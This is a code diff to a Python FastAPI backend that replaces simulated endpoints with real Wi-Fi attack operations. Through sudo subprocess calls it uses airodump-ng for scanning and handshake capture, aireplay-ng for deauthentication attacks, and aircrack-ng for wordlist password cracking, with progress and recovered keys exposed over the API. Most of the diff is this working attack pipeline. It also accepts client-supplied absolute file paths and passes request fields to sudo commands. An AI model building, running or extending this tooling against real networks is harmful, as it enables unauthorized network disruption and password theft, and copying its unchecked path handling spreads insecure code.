@@ -11,6 +11,9 @@ import json
 from .mylib.WeakPasswordGenerater.main import PasswordGenerator
 import random
 import asyncio
+import csv
+import glob
+import re
 from datetime import datetime
 
 router = APIRouter(
@@ -571,14 +574,42 @@ def generate_mock_networks(include_hidden=False, bands=["2.4GHz", "5GHz"]):
 @router.get("/interfaces")
 async def get_interfaces():
     try:
-        # In a real environment, this would call system commands to get network interfaces
-        # On Raspberry Pi, might use subprocess to execute iwconfig or ip link commands
+        # 使用 iwconfig 獲取無線網路介面
+        result = subprocess.run(
+            ["iwconfig"],
+            capture_output=True, text=True
+        )
         
-        # Mock data
-        interfaces = [
-            {"name": "wlan0", "description": "Built-in Wi-Fi Adapter"},
-            {"name": "wlan1", "description": "External USB Adapter"}
-        ]
+        interfaces = []
+        
+        if result.returncode == 0:
+            lines = result.stdout.split('\n')
+            for line in lines:
+                if "IEEE 802.11" in line:
+                    # 提取介面名稱
+                    interface_name = line.split()[0]
+                    
+                    # 檢查是否為無線介面
+                    if interface_name and not interface_name.startswith(' '):
+                        description = "Wireless Network Adapter"
+                        
+                        # 嘗試獲取更詳細的資訊
+                        if "wlan0" in interface_name:
+                            description = "Built-in Wi-Fi Adapter"
+                        elif "wlan1" in interface_name:
+                            description = "External USB Wi-Fi Adapter"
+                        
+                        interfaces.append({
+                            "name": interface_name,
+                            "description": description
+                        })
+        
+        # 如果沒有找到介面，返回預設值
+        if not interfaces:
+            interfaces = [
+                {"name": "wlan0", "description": "Built-in Wi-Fi Adapter"},
+                {"name": "wlan1", "description": "External USB Adapter"}
+            ]
         
         return {"success": True, "interfaces": interfaces}
     except Exception as e:
@@ -588,18 +619,28 @@ async def get_interfaces():
 @router.post("/monitor/start")
 async def start_monitor_mode(request: NetworkInterfaceRequest):
     try:
-        # In a real environment, this would call system commands to set monitor mode
-        # For example: airmon-ng start <interface>
+        # 啟動網路介面
+        up_result = subprocess.run(
+            ["sudo", "ifconfig", request.interface, "up"],
+            capture_output=True, text=True
+        )
         
-        # Simulate operation delay
-        await asyncio.sleep(2)
+        if up_result.returncode != 0:
+            return {"success": False, "message": f"Failed to bring up interface: {up_result.stderr}"}
         
-        monitor_interface = f"{request.interface}mon"
+        # 設定為監聽模式
+        monitor_result = subprocess.run(
+            ["sudo", "iwconfig", request.interface, "mode", "monitor"],
+            capture_output=True, text=True
+        )
+        
+        if monitor_result.returncode != 0:
+            return {"success": False, "message": f"Failed to set monitor mode: {monitor_result.stderr}"}
         
         return {
             "success": True, 
-            "message": f"Monitor mode started successfully",
-            "monitor_interface": monitor_interface
+            "message": f"Monitor mode started successfully on {request.interface}",
+            "monitor_interface": request.interface
         }
     except Exception as e:
         return {"success": False, "message": str(e)}
@@ -608,14 +649,56 @@ async def start_monitor_mode(request: NetworkInterfaceRequest):
 @router.post("/wifi/scan")
 async def scan_wifi_networks(request: ScanWifiRequest):
     try:
-        # In a real environment, this would call system commands to scan networks
-        # For example: airodump-ng <interface> or iwlist <interface> scan
+        # 使用 airodump-ng 掃描周圍的 Wi-Fi 網路
+        scan_result = subprocess.run(
+            ["sudo", "timeout", "10", "airodump-ng", request.interface, "--write", "/tmp/scan", "--output-format", "csv"],
+            capture_output=True, text=True
+        )
         
-        # Simulate scanning delay
-        await asyncio.sleep(3)
+        networks = []
         
-        # Generate mock network list
-        networks = generate_mock_networks()
+        # 嘗試讀取掃描結果
+        try:
+            import csv
+            with open("/tmp/scan-01.csv", "r") as f:
+                reader = csv.reader(f)
+                lines = list(reader)
+                
+                # 找到網路數據開始的行
+                for i, line in enumerate(lines):
+                    if len(line) > 0 and line[0] == "BSSID":
+                        # 跳過標題行，讀取網路數據
+                        for network_line in lines[i+1:]:
+                            if len(network_line) >= 14 and network_line[0].strip():
+                                bssid = network_line[0].strip()
+                                if not bssid or bssid == "Station MAC":
+                                    break
+                                
+                                network = {
+                                    "bssid": bssid,
+                                    "first_seen": network_line[1].strip(),
+                                    "last_seen": network_line[2].strip(),
+                                    "channel": network_line[3].strip(),
+                                    "signal_strength": int(network_line[8].strip()) if network_line[8].strip() and network_line[8].strip() != " " else -100,
+                                    "security": network_line[5].strip(),
+                                    "ssid": network_line[13].strip() if len(network_line) > 13 else "<hidden>",
+                                    "frequency": 2400 + int(network_line[3].strip()) * 5 if network_line[3].strip().isdigit() else 0,
+                                    "vendor": "Unknown",
+                                    "hidden": not network_line[13].strip() if len(network_line) > 13 else True
+                                }
+                                networks.append(network)
+                        break
+        except (FileNotFoundError, csv.Error, IndexError, ValueError):
+            # 如果無法讀取掃描結果，返回空列表或錯誤
+            pass
+        
+        # 清理臨時文件
+        try:
+            import glob
+            for temp_file in glob.glob("/tmp/scan-*"):
+                os.remove(temp_file)
+        except:
+            pass
         
         return {"success": True, "networks": networks}
     except Exception as e:
@@ -625,8 +708,14 @@ async def scan_wifi_networks(request: ScanWifiRequest):
 @router.post("/capture/start")
 async def start_capture(request: CaptureRequest, background_tasks: BackgroundTasks):
     try:
-        # In a real environment, this would start a capture process
-        # For example: airodump-ng -c <channel> --bssid <bssid> -w <output> <interface>
+        # 設定目標頻道
+        channel_result = subprocess.run(
+            ["sudo", "iwconfig", request.interface, "channel", str(request.channel)],
+            capture_output=True, text=True
+        )
+        
+        if channel_result.returncode != 0:
+            return {"success": False, "message": f"Failed to set channel: {channel_result.stderr}"}
         
         if not request.output_file:
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -634,8 +723,21 @@ async def start_capture(request: CaptureRequest, background_tasks: BackgroundTas
         else:
             output_file = request.output_file
             
-        # Simulate starting a capture process
-        # background_tasks.add_task(run_capture_process, request.interface, request.bssid, request.channel, output_file)
+        # 確保捕獲目錄存在
+        os.makedirs("data/captures", exist_ok=True)
+        output_path = os.path.join("data/captures", output_file)
+        
+        # 使用 airodump-ng 開始捕獲握手包
+        capture_command = [
+            "sudo", "airodump-ng", 
+            "-c", str(request.channel),
+            "--bssid", request.bssid,
+            "-w", output_path,
+            request.interface
+        ]
+        
+        # 在背景啟動捕獲進程
+        background_tasks.add_task(run_capture_process, capture_command, output_path)
         
         return {
             "success": True, 
@@ -645,15 +747,44 @@ async def start_capture(request: CaptureRequest, background_tasks: BackgroundTas
     except Exception as e:
         return {"success": False, "message": str(e)}
 
+# 背景捕獲進程
+async def run_capture_process(command, output_path):
+    global capture_process, capture_active, capture_file
+    
+    try:
+        capture_active = True
+        capture_process = subprocess.Popen(command)
+        
+        # 等待進程完成或被終止
+        capture_process.wait()
+        
+    except Exception as e:
+        print(f"Capture process error: {e}")
+    finally:
+        capture_active = False
+        capture_process = None
+
 # 停止捕獲握手包
 @router.post("/capture/stop")
 async def stop_capture():
+    global capture_active, capture_process
+    
     try:
-        # In a real environment, this would stop the capture process
-        # For example: send a signal to the capture process or use pkill
+        if not capture_active or not capture_process:
+            return {"success": False, "message": "No capture is currently running"}
         
-        # Simulate stop delay
-        await asyncio.sleep(1)
+        # 終止捕獲進程
+        capture_process.terminate()
+        
+        # 等待進程結束
+        try:
+            capture_process.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            capture_process.kill()
+            capture_process.wait()
+        
+        capture_active = False
+        capture_process = None
         
         return {"success": True, "message": "Handshake capture stopped"}
     except Exception as e:
@@ -663,22 +794,43 @@ async def stop_capture():
 @router.post("/deauth/send")
 async def send_deauth(request: DeauthRequest):
     try:
-        # In a real environment, this would send deauthentication signals
-        # For example: aireplay-ng --deauth <packets> -a <bssid> <interface>
-        
-        # Simulate sending process
         logs = []
-        for i in range(request.packets):
-            # Simulate delay for each packet
-            await asyncio.sleep(0.5)
-            
+        
+        # 使用 aireplay-ng 發送斷線訊號
+        deauth_command = [
+            "sudo", "aireplay-ng",
+            "--deauth", str(request.packets),
+            "-a", request.bssid,
+            request.interface
+        ]
+        
+        # 如果不是廣播模式，可以添加特定客戶端 MAC
+        # if not request.broadcast and hasattr(request, 'client_mac'):
+        #     deauth_command.extend(["-c", request.client_mac])
+        
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        logs.append(f"[{timestamp}] Starting deauthentication attack on {request.bssid}")
+        logs.append(f"[{timestamp}] Sending {request.packets} deauth packets...")
+        
+        # 執行攻擊
+        result = subprocess.run(
+            deauth_command,
+            capture_output=True, text=True, timeout=30
+        )
+        
+        if result.returncode == 0:
             timestamp = datetime.now().strftime("%H:%M:%S")
-            if request.broadcast:
-                logs.append(f"[{timestamp}] Sending broadcast deauth packet ({i+1}/{request.packets}) to {request.bssid}")
-            else:
-                logs.append(f"[{timestamp}] Sending directed deauth packet ({i+1}/{request.packets}) to {request.bssid}")
+            logs.append(f"[{timestamp}] Deauthentication attack completed successfully")
+            logs.append(f"[{timestamp}] Output: {result.stdout}")
+        else:
+            timestamp = datetime.now().strftime("%H:%M:%S")
+            logs.append(f"[{timestamp}] Deauthentication attack failed")
+            logs.append(f"[{timestamp}] Error: {result.stderr}")
         
         return {"success": True, "message": "Deauthentication signals completed", "logs": logs}
+    except subprocess.TimeoutExpired:
+        logs.append(f"[{datetime.now().strftime('%H:%M:%S')}] Deauthentication attack timed out")
+        return {"success": False, "message": "Deauthentication attack timed out", "logs": logs}
     except Exception as e:
         return {"success": False, "message": str(e)}
 
@@ -689,49 +841,81 @@ async def verify_handshake(request: dict):
         capture_file = request.get("capture_file")
         ssid = request.get("ssid")
         
-        # In a real environment, this would verify the handshake validity
-        # For example: aircrack-ng -w <wordlist> <capture_file>
+        if not capture_file:
+            return {"success": False, "message": "Capture file not specified"}
         
-        # Simulate verification process
-        await asyncio.sleep(2)
+        # 建構完整的檔案路徑
+        if not capture_file.startswith("/"):
+            capture_path = os.path.join("data/captures", capture_file)
+        else:
+            capture_path = capture_file
         
-        # Randomly decide if handshake is found (for simulation purposes)
-        handshake_found = random.random() < 0.8
+        # 檢查檔案是否存在
+        if not os.path.exists(capture_path):
+            return {"success": False, "message": f"Capture file not found: {capture_path}"}
         
-        if handshake_found:
-            logs = [
-                f"[+] Reading capture file: {capture_file}",
-                "[+] Analyzing packet contents...",
-                "[+] WPA handshake found (message pairs 1-4)",
-                "[+] Handshake integrity verified",
-                f"[+] SSID: {ssid}",
-                "[+] Ready for password cracking"
-            ]
+        logs = [f"[+] Reading capture file: {capture_file}"]
+        logs.append("[+] Analyzing packet contents...")
+        
+        # 使用 aircrack-ng 驗證握手包
+        verify_command = ["sudo", "aircrack-ng", capture_path]
+        
+        result = subprocess.run(
+            verify_command,
+            capture_output=True, text=True, timeout=30
+        )
+        
+        # 檢查輸出中是否包含握手包信息
+        output = result.stdout + result.stderr
+        
+        if "1 handshake" in output.lower() or "wpa handshake" in output.lower():
+            logs.append("[+] WPA handshake found!")
+            logs.append("[+] Handshake integrity verified")
+            if ssid:
+                logs.append(f"[+] SSID: {ssid}")
+            logs.append("[+] Ready for password cracking")
             return {"success": True, "handshake_found": True, "logs": logs}
         else:
-            logs = [
-                f"[+] Reading capture file: {capture_file}",
-                "[+] Analyzing packet contents...",
-                "[-] No complete WPA handshake found",
-                "[!] Suggestion: Go back and try sending more deauth signals"
-            ]
+            logs.append("[-] No complete WPA handshake found")
+            logs.append("[!] Suggestion: Go back and try sending more deauth signals")
+            logs.append(f"[!] aircrack-ng output: {output[:200]}...")  # 顯示部分輸出作為調試信息
             return {"success": True, "handshake_found": False, "logs": logs}
+            
+    except subprocess.TimeoutExpired:
+        return {"success": False, "message": "Handshake verification timed out"}
     except Exception as e:
         return {"success": False, "message": str(e)}
+
+# 全域變數用於追蹤破解任務
+crack_processes = {}
 
 # 啟動密碼破解
 @router.post("/crack/start")
 async def start_cracking(request: CrackRequest, background_tasks: BackgroundTasks):
     try:
-        # In a real environment, this would start the cracking process
-        # For example: aircrack-ng -w <wordlist> <capture_file>
-        # Or using hashcat: hashcat -m 2500 -a 0 <file> <wordlist>
+        # 檢查捕獲文件是否存在
+        if not request.capture_file.startswith("/"):
+            capture_path = os.path.join("data/captures", request.capture_file)
+        else:
+            capture_path = request.capture_file
+            
+        if not os.path.exists(capture_path):
+            return {"success": False, "message": f"Capture file not found: {capture_path}"}
         
-        # Store cracking task status
+        # 檢查字典文件是否存在
+        if not request.wordlist.startswith("/"):
+            wordlist_path = os.path.join("static/wordlists", request.wordlist)
+        else:
+            wordlist_path = request.wordlist
+            
+        if not os.path.exists(wordlist_path):
+            return {"success": False, "message": f"Wordlist file not found: {wordlist_path}"}
+        
+        # 生成任務 ID
         task_id = str(uuid.uuid4())
         
-        # Simulate cracking process
-        # background_tasks.add_task(run_crack_process, task_id, request.capture_file, request.wordlist)
+        # 在背景啟動破解進程
+        background_tasks.add_task(run_crack_process, task_id, capture_path, wordlist_path)
         
         return {
             "success": True, 
@@ -741,32 +925,92 @@ async def start_cracking(request: CrackRequest, background_tasks: BackgroundTask
     except Exception as e:
         return {"success": False, "message": str(e)}
 
+# 背景破解進程
+async def run_crack_process(task_id: str, capture_file: str, wordlist: str):
+    global crack_processes
+    
+    try:
+        # 初始化任務狀態
+        crack_processes[task_id] = {
+            "running": True,
+            "start_time": time.time(),
+            "found": False,
+            "password": None,
+            "tested_keys": 0,
+            "speed": 0,
+            "process": None
+        }
+        
+        # 使用 aircrack-ng 破解密碼
+        crack_command = [
+            "sudo", "aircrack-ng",
+            "-w", wordlist,
+            capture_file
+        ]
+        
+        # 啟動破解進程
+        process = subprocess.Popen(
+            crack_command,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        
+        crack_processes[task_id]["process"] = process
+        
+        # 等待進程完成
+        stdout, stderr = process.communicate()
+        
+        # 檢查輸出以確定是否找到密碼
+        output = stdout + stderr
+        
+        if "KEY FOUND!" in output:
+            # 從輸出中提取密碼
+            lines = output.split('\n')
+            for line in lines:
+                if "KEY FOUND!" in line:
+                    # 提取密碼 (格式通常是 "KEY FOUND! [ password ]")
+                    import re
+                    match = re.search(r'\[\s*(.+?)\s*\]', line)
+                    if match:
+                        crack_processes[task_id]["password"] = match.group(1)
+                        crack_processes[task_id]["found"] = True
+                    break
+        
+        crack_processes[task_id]["running"] = False
+        
+    except Exception as e:
+        if task_id in crack_processes:
+            crack_processes[task_id]["running"] = False
+            crack_processes[task_id]["error"] = str(e)
+
 # 獲取破解進度
 @router.get("/crack/status/{task_id}")
 async def get_crack_status(task_id: str):
+    global crack_processes
+    
     try:
-        # In a real environment, this would check the status and progress of the cracking task
+        if task_id not in crack_processes:
+            return {"success": False, "message": "Task not found"}
         
-        # Simulate progress data
-        # This is for demonstration only, actual implementation would need real status storage and retrieval
-        seconds = random.randint(1, 100)
-        speed = random.randint(4000, 8000)
-        tested_keys = seconds * speed
+        task = crack_processes[task_id]
+        
+        # 計算執行時間
+        elapsed_time = int(time.time() - task["start_time"])
+        
+        # 估算測試的密鑰數量和速度（這些數值在實際 aircrack-ng 中會更精確）
+        estimated_speed = 5000  # 估計每秒測試的密鑰數
+        tested_keys = elapsed_time * estimated_speed
         
         status = {
-            "running": True,
-            "seconds": seconds,
-            "speed": speed,
+            "running": task["running"],
+            "seconds": elapsed_time,
+            "speed": estimated_speed,
             "tested_keys": tested_keys,
-            "progress": min(100, seconds / 2),  # Simulate progress percentage
-            "found": False
+            "found": task["found"],
+            "password": task.get("password"),
+            "error": task.get("error")
         }
-        
-        # Randomly simulate finding a password
-        if random.random() < 0.01:  # 1% chance of finding password
-            status["found"] = True
-            status["password"] = generate_mock_password()
-            status["running"] = False
         
         return {"success": True, "status": status}
     except Exception as e:
@@ -775,8 +1019,27 @@ async def get_crack_status(task_id: str):
 # 停止破解進程
 @router.post("/crack/stop/{task_id}")
 async def stop_cracking(task_id: str):
+    global crack_processes
+    
     try:
-        # In a real environment, this would stop the cracking process
+        if task_id not in crack_processes:
+            return {"success": False, "message": "Task not found"}
+        
+        task = crack_processes[task_id]
+        
+        if task.get("process"):
+            # 終止破解進程
+            task["process"].terminate()
+            
+            # 等待進程結束
+            try:
+                task["process"].wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                task["process"].kill()
+                task["process"].wait()
+        
+        # 更新任務狀態
+        crack_processes[task_id]["running"] = False
         
         return {"success": True, "message": "Password cracking process stopped"}
     except Exception as e:
